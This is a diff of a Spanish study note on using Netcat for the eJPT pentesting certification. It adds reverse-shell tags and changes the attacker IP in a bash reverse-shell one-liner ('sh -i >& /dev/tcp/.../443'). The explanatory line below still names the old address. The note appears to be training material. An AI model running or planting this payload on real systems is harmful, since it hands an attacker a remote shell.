@@ -1,6 +1,6 @@
 
 ---
-- TAG: #Introducción #hacking #basico
+- TAG: #Introducción #hacking #basico #ReverShell #Netcat 
 ---
 ## Utilización de Netcat para el eJPT
 
@@ -30,7 +30,7 @@ Una herramienta útil para este proceso es [RevShells](https://www.revshells.com
 El payload generado tendrá un aspecto similar a este:
 
 ```bash
-sh -i >& /dev/tcp/192.168.100.42/443 0>&1
+sh -i >& /dev/tcp/1.2.3.4/443 0>&1
 ```
 
 Donde `192.168.100.42` es la dirección IP de nuestra máquina atacante y `443` es el puerto.
